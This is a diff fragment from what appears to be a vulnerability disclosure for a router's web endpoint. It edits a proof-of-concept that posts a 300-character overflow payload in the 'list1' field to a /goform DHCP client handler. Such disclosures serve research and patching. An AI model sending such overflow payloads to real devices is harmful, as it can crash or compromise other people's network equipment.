@@ -24,7 +24,7 @@ get value from strlist ,named list1、list2······, and we must set listcnt
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/fromDhcpListClient"
+url = "http://192.168.1.13/goform/DhcpListClient"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'list1': payload, 'LISTLEN': 1})
